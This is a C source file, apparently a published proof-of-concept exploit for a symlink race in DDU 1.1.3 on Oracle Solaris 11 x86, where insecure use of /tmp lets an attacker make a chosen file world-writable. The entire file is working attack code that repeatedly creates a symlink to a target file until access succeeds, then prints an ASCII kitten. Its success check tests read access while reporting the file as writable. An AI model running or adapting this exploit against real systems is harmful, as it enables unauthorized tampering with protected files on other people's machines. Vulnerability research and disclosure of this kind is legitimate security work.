
/*
Exploit for DDU 1.1.3 Oracle Solaris 11 x86.
Insecure use of /tmp leads to chmod 666 on targeted file.
Larry W. Cashdollar
2/2/2020
*/

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

void art (void);

int
main (int argc, char **argv)
{

  if (argc < 2)
    {
      printf ("Missing arguments! from -> to link\n");
      exit (0);
    }
  printf
    ("[+]     Exploit for DDU v1.1.3 Solaris 11     [+]\nLarry W. Cashdollar\nKeeping a symlink from %s to %s\n",
     argv[2], argv[1]);
  while (1)
    {

      symlink (argv[2], argv[1]);
      if (access (argv[2], R_OK) == 0)
	{
	  printf ("Success! %s is writable\n\nHere have a kitten\n", argv[2]);
	  art ();
	  exit (0);
	}
    }
  return (0);
}


void
art (void)
{
  printf ("         /\\_/\\\n");
  printf ("    ____/ o o \\\n");
  printf ("  /~____  =Ã¸= /\n");
  printf (" (______)__m_m)\n");
}
